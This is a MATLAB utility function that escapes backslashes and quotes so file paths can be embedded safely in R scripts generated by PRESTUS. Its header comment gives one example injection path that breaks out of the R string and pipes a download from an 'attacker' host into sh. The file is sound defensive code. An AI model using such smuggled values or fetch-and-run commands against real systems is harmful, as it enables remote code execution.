function quoted = r_quote_string(str)
% R_QUOTE_STRING  Escape a string for safe embedding in a generated R string literal.
%
% Some PRESTUS functions build small R scripts on the fly (e.g.
% POSITION_TRANSDUCER_TUS_ENTRY writes readNIfTI("%s") calls with paths
% substituted via sprintf) and then execute them with Rscript. Splicing a
% path directly into a double-quoted R string literal without escaping is
% a code-injection risk distinct from (but analogous to) shell command
% injection: a path containing a literal " ends the R string early and
% anything after it is parsed as R code, e.g.
%   foo".nii.gz"); system("curl http://attacker | sh"); x <- readNIfTI("
% would execute the embedded system() call when Rscript runs the file.
%
% This function escapes backslashes and double quotes the same way R
% itself does, so the value is safe to place between a pair of literal "
% characters in generated R source.
%
% Use as:
%   src = sprintf('readNIfTI("%s")', r_quote_string(path));
%
% Input:
%   str - (1,:) char to embed in an R double-quoted string literal
%
% Output:
%   quoted - char row vector: str with \ and " escaped for R
%
% See also: POSITION_TRANSDUCER_TUS_ENTRY, SHELL_QUOTE_ARG

    arguments
        str (1,:) char
    end

    quoted = strrep(str, '\', '\\');
    quoted = strrep(quoted, '"', '\"');
end
